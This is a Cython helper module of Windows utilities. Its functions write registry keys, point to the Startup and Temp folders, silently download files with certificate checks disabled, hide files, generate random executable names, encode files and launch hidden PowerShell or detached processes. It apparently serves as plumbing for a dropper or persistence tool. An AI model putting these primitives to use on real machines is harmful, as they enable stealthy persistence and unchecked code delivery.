import ctypes
from ctypes import wintypes
import os
import platform
import random
import string
import subprocess
import sys
import requests
import winreg
from base64 import b64encode,b85encode,a85encode
from zipfile import ZipFile
requests.packages.urllib3.disable_warnings()
startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
startupFolder = "c:/users/{}/appdata/roaming/microsoft/windows/start menu/programs/startup/{}"
tempFolder = "c:/users/{}/appdata/local/temp/{}"
BaseTempFolder = "c:/users/{}/appdata/local/temp"
TypicalRegistryKey = "SOFTWARE\Microsoft"


cpdef bint setRegistryKey(str key_name, str value, str registry_path, bint HKLM=False):
    """
    :param key_name: registry key name
    :type key_name: str
    :param value: registry value
    :type value: str
    :param registry_path: full path to registry key
    :type registry_path: str
    :param HKLM: is HKLM
    :type HKLM: bool
    :return: bool
    """
    try:
        if HKLM:
            base_path = winreg.HKEY_LOCAL_MACHINE
        else:
            base_path = winreg.HKEY_CURRENT_USER
        winreg.CreateKey(base_path, registry_path)
        registry_key = winreg.OpenKey(base_path, registry_path, 0,
                                       winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError:
        return False

cpdef str getRegistryKey(str key_name,str registry_path,bint HKLM = False):
    """
    :param key_name: registry key name
    :type key_name: str
    :param registry_path: full path to registry key
    :type registry_path: str
    :param HKLM: is HKLM
    :type HKLM: bool
    :return: bool
    """
    try:
        if HKLM:
            base_path = winreg.HKEY_LOCAL_MACHINE
        else:
            base_path = winreg.HKEY_CURRENT_USER
        registry_key = winreg.OpenKey(base_path, registry_path, 0,
                                       winreg.KEY_READ)
        value, regtype = winreg.QueryValueEx(registry_key, key_name)
        winreg.CloseKey(registry_key)
        return str(value)
    except WindowsError:
        return ""

cpdef bint extract_zip(str extraction_path, str file_to_extract):
    """
    :param extraction_path: full path to the dir that we will extract the zip into
    :param file_to_extract: name of file (possibly full path) of file to extract
    """
    try:
        with ZipFile(file_to_extract) as zf:
            zf.extractall(extraction_path)
        return True
    except Exception as e:
        print(e)
        return False


cpdef bint is_online():
    """check if we can access google.com. """
    try:
        x = requests.get('https://google.com', verify=False)
        return True
    except Exception as e:
        return False


cpdef bint is_python_exist():
    """check if python exist."""
    possible_location = ['c:/Program Files','c:/Program Files (x86)','c:/ProgramData']
    python_reg_key = r"SOFTWARE\Python\PythonCore\3.{}\InstallPath"
    python_reg_value = "ExecutablePath"
    for python_minor_version in range(5, 10):
        try:
            if is_admin():
                value = getRegistryKey(key_name=python_reg_value,
                                       registry_path=python_reg_key.format(python_minor_version), HKLM=True)
            else:
                value = getRegistryKey(key_name=python_reg_value,
                                       registry_path=python_reg_key.format(python_minor_version), HKLM=False)
            if value:
                return True
        except Exception as e:
            continue
    for num in range(10, 45):
        if os.path.exists(f"C:/Users/{os.getlogin()}/Appdata/Local/Programs/Python/Python{num}/python.exe"):
            return True
        if os.path.exists(f"C:/Program Files/Python{num}/python.exe"):
            return True
    for location in possible_location:
        for file in os.listdir(location):
            if os.path.isdir(file) and 'python' in file.lower():
                return True
    return False


cpdef bint install_with_pyinstaller(str pyinstaller_path,str base_dir,str file_to_install,bint onefile=True,list hidden_imports=[]):
    """
    :param str pyinstaller_path: full path to pyinstaller exe
    :param str base_dir: base_dir of the file to install.
    :param str file_to_install: name of py/pyx file to install
    :param bool onefile: is onefile. default true
    :param list hidden_imports: list of hidden imports to include. can be default none

    //TODO 14: THIS IS NOT UNDERSTANDABLE FUNCTION! FIX IT
    //TODO 15: we use here run_pwsh, but we might dont want powershell. but a hidden subprocess.
    """
    onefile_str = "--onefile" if onefile else ""
    print(onefile_str)
    hidden_imports_list = ''.join([f'--hidden-import={i} ' for i in hidden_imports]) if hidden_imports else ''
    print(hidden_imports_list)
    distpath = base_dir
    to_run = "{} {} {} {} --distpath {} --icon=NONE".format(pyinstaller_path,onefile_str, hidden_imports_list,os.path.join(base_dir,file_to_install),distpath)
    print(to_run,run_pwsh(to_run))
    return True

cpdef bint is_admin():
    """Returns true if user is admin."""
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin


cpdef bint download_file(str path, str URL):
    """
    :param str path: full path on file system to download the file into
    :param str URL: url to download from.
    """
    with requests.get(URL, stream=True,verify=False) as r:
        r.raise_for_status()
        with open(path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                # If you have chunk encoded response uncomment if
                # and set chunk_size parameter to None.
                # if chunk:
                f.write(chunk)
    return True

cpdef bint hide_path(str p):
    """
    :param p: path that we want to make "hidden" using windows api.
    """
    try:
        ctypes.windll.kernel32.SetFileAttributesW(p, 0x02)
        return True
    except Exception as e:
        return False

def baseRandomstr(length) -> str:
    """we do this here, as closures can't be applied inside cpdef"""
    base_str = ''.join((random.choice(string.ascii_letters) for x in range(length)))
    return base_str

cpdef str random_string(int length=0,bint is_random=False,bint is_zip=False,bint is_exe=False,bint is_py=False):
    """
    :param length: length of random string.
    """
    if is_random or not length:
        length = random.randrange(5,15)
    base_str =baseRandomstr(length)
    if is_zip:
        return base_str + '.zip'
    elif is_exe:
        return base_str + '.exe'
    elif is_py:
        return base_str + '.py'
    else:
        return base_str


cpdef str run_pwsh(str code):
    """
    :param code: powershell code to run

    //TODO 16: add creation flags to make hidden, but still get stdout.
    """
    p = subprocess.run(['powershell', code], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    return p.stdout.decode()

cpdef str run_detached_process(str code, bint is_powershell=False):
    DETACHED_NEW_WITH_CONSOLE = {
        'close_fds': True,  # close stdin/stdout/stderr on child
        'creationflags': 0x00000008 | 0x00000200,
    }
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    if is_powershell:
        p = subprocess.run(code,stdin=subprocess.DEVNULL, shell=True, **DETACHED_NEW_WITH_CONSOLE)
        return ""
    else:
        p = subprocess.Popen(code,stdin=subprocess.DEVNULL, stderr=subprocess.PIPE, stdout=subprocess.PIPE, **DETACHED_NEW_WITH_CONSOLE)
    stdout, stderr = p.communicate()
    return stdout.decode()


cpdef bint is_os_64bit():
    """
    returns True if os is 64bit, False if 32bit
    """
    return platform.machine().endswith('64')


cpdef str find_python_path():
    python_reg_key = r"SOFTWARE\Python\PythonCore\3.{}\InstallPath"
    python_reg_value = "ExecutablePath"
    BASIC_APPDATA_LOCATION = r"c:\Users\{}\appdata\local\Programs\Python\Python3{}\python.exe"
    possible_locations = ['c:/Program Files', 'c:/Program Files (x86)', 'c:/ProgramData']
    for python_minor_version in range(5,10):
        try:
            admin_value = getRegistryKey(key_name=python_reg_value,registry_path=python_reg_key.format(python_minor_version),HKLM=True)
            user_value = getRegistryKey(key_name=python_reg_value,registry_path=python_reg_key.format(python_minor_version),HKLM=False)
            if user_value:
                return user_value
            if admin_value:
                return admin_value
        except WindowsError:
            continue
        if os.path.exists(BASIC_APPDATA_LOCATION.format(os.getlogin(),python_minor_version)):
            return BASIC_APPDATA_LOCATION.format(os.getlogin(),python_minor_version)
    for location in possible_locations:
        if os.path.exists(location) and os.path.isdir(location):
            for directory in os.listdir(location):
                if 'python' in directory.lower():
                    if ''.join([char for char in directory.lower() if char.isdigit()]).startswith('3'):
                        path_to_python = os.path.join(location,directory)
                        if 'python.exe' in os.listdir(path_to_python):
                            return os.path.join(path_to_python,'python.exe')


    from_shell = ''.join([line.strip() for line in run_pwsh("where python").splitlines() if 'WindowsApps' not in line and 'python.exe' in line])
    if from_shell:
        return from_shell
    return ""

cpdef bint is_gcc_in_path():
    paths = os.environ['path'].split(';')
    for path in paths:
        if 'mingw64' in path.lower():
            return True
    return False


cpdef str base64_encode_file(str file_path):
    """
    we are gonna read the file in rb mode, encode in base64, and return the base64.
    :param file_path: full path to file to encode in base64.
    """
    with open(file_path,'rb') as file:
        base64_info = b64encode(file.read())
        return base64_info.decode()

cpdef str base85_encode_file(str file_path):
    """
    we are gonna read the file in rb mode, encode in base85, and return the base85.
    :param file_path: full path to file to encode in base85.
    """
    with open(file_path, 'rb') as file:
        base85_info = b85encode(file.read())
        return base85_info.decode()

cpdef str a85_encode_file(str file_path):
    """
    we are gonna read the file in rb mode, encode in a85, and return the a85.
    :param file_path: full path to file to encode in a85.
    """
    with open(file_path, 'rb') as file:
        a85_info = a85encode(file.read())
        return a85_info.decode()


cpdef str get_current_file_path():
    """
    this function return the full current path to the exe running.
    """
    if getattr(sys, 'frozen', False):
        # If the application is run as a bundle, the PyInstaller bootloader
        # extends the sys module by a flag frozen=True and sets the app
        # path into variable _MEIPASS'.
        application_path = sys.executable
    else:
        application_path = os.path.dirname(os.path.abspath(__file__))
    return application_path

cpdef bint is_msvc_exist():
        """
        this function check in the registry if we have visual studio installed.
        we return True if we find something. false if else.
        //TODO 18: find better ways to do this
        """
        try:
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,"SOFTWARE\Wow6432Node\Microsoft\VisualStudio",0)
            return True
        except Exception as e:
            return False


cpdef bint ctypes_update_system():
    """
    use ctypes to call SendMessageTimeout directly
    to send broadcast to all windows.
    """
    SendMessageTimeout = ctypes.windll.user32.SendMessageTimeoutW
    UINT = wintypes.UINT
    SendMessageTimeout.argtypes = wintypes.HWND, UINT, wintypes.WPARAM, ctypes.c_wchar_p, UINT, UINT, UINT
    SendMessageTimeout.restype = wintypes.LPARAM
    HWND_BROADCAST = 0xFFFF
    WM_SETTINGCHANGE = 0x1A
    SMTO_NORMAL = 0x000
    SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 'Environment', SMTO_NORMAL, 10, 0)
    return True



cpdef bint set_env_variable(str name, str value):
    '''
    :param name: environment variable name
    :param value: environment variable value
    '''

    if os.environ.get(name):
        if value in os.environ[name]:
            return True
        os.environ[name] = value + os.pathsep + os.environ[name]
        return True
    return False